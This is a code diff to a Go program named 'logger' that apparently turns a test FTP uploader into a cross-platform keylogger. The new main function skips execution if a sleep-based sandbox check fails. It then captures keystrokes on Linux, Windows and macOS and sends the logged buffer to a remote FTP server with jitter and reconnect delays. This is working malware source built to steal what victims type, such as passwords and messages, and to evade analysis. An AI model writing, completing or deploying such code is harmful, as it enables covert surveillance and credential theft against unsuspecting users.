@@ -2,13 +2,14 @@ package main
 
 import (
 	"bytes"
-	"fmt"
 	"log"
-	"math/rand"
-	"net"
+	"runtime"
 	"time"
 
-	"github.com/jlaffaye/ftp"
+	"github.com/adelapazborrero/logger/connector"
+	"github.com/adelapazborrero/logger/linux"
+	"github.com/adelapazborrero/logger/mac"
+	"github.com/adelapazborrero/logger/windows"
 )
 
 const (
@@ -18,71 +19,33 @@ const (
 	MAX_JITTER      = 5
 	USERNAME        = "anonymous"
 	PASSWORD        = ""
+	LOG_BUFFER_SIZE = 1024
 )
-
-func GetLocalIP() net.IP {
-	conn, err := net.Dial("udp", "8.8.8.8:80")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer conn.Close()
-
-	localAddress := conn.LocalAddr().(*net.UDPAddr)
-
-	return localAddress.IP
-}
-
-func addJitter() {
-	jitter := rand.Intn(MAX_JITTER)
-	time.Sleep(RECONNECT_DELAY + time.Duration(jitter)*time.Second)
-}
-
-func connectFTP() *ftp.ServerConn {
-	c, err := ftp.Dial(FTP_HOST, ftp.DialWithTimeout(DEFAULT_TIMEOUT))
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = c.Login(USERNAME, PASSWORD)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	return c
-}
-
-func sendData() {
-	iterations := 1
-
-	while := true
-	for while {
-		now := time.Now()
-		addJitter()
-
-		c := connectFTP()
-
-		data := bytes.NewBufferString(fmt.Sprintf("Hello, World! Iteration: %d", iterations))
-
-		err := c.Append(fmt.Sprintf("%s.txt", GetLocalIP().String()), data)
-		if err != nil {
-			log.Println(err)
-			c.Quit()
-			while = false
-		}
-
-		log.Printf("Iteration: %d, Time: %s\n", iterations, time.Since(now))
-		iterations++
-		c.Quit()
-	}
-}
 
 func main() {
 	now := time.Now()
 	time.Sleep(3 * time.Second)
 
 	if time.Since(now) < 3*time.Second {
+		log.Fatal("Nothing to do. Exiting...")
 		return
 	}
 
-	sendData()
+	logBuffer := new(bytes.Buffer)
+
+	switch runtime.GOOS {
+	case "linux":
+		go linux.CaptureKeyboardKeysLinux(logBuffer)
+	case "windows":
+		go windows.CaptureKeyboardKeysWindows(logBuffer)
+	case "darwin":
+		go mac.CaptureKeyboardKeysDarwin(logBuffer)
+	default:
+		log.Fatal("Unsupported operating system")
+		return
+	}
+
+	ftp := connector.NewFTP(FTP_HOST, USERNAME, PASSWORD, DEFAULT_TIMEOUT, MAX_JITTER, RECONNECT_DELAY)
+
+	ftp.SendData(logBuffer)
 }
